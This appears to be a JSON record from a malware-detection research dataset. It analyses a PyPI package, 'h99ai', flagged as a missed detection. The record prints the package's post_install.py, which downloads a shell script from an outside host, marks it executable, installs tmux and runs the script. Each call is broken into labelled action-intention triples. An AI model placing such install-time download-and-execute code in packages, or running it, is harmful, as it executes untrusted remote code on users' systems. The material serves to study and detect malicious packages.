{
  "metadata": {
    "package_name": "h99ai-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/h99ai-0.1.0-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "post_install.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport subprocess\nimport urllib.request\n\ndef download_and_run_script():\n    script_url = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh'  # Replace with your actual script URL\n    script_path = os.path.join(os.path.expanduser(\"~\"), 'dh-storage-v1.1.sh')\n\n    # Download the script\n    urllib.request.urlretrieve(script_url, script_path)\n\n    # Make the script executable\n    os.chmod(script_path, 0o755)\n\n    # Run the script\n    os.system('apt update && apt install tmux -y ')\n    subprocess.run(['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--localpath', '/tmp'])\n\nif __name__ == \"__main__\":\n    download_and_run_script()",
          "triple_sequences": [
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "~",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Access user home directory",
              "intention_id": "access_user_home_directory"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.expanduser(\"~\"), 'dh-storage-v1.1.sh'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "urllib.request.urlretrieve()",
              "action_description": "Downloads file from URL to local path",
              "action_id": "download_file_url",
              "object": "curl -L -O https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh, script_path",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.chmod()",
              "action_description": "Changes file mode to add execute permission",
              "action_id": "change_file_mode_execute",
              "object": "script_path, 0o755",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "apt update && apt install tmux -y ",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--localpath', '/tmp']",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            }
          ]
        }
      ]
    }
  ]
}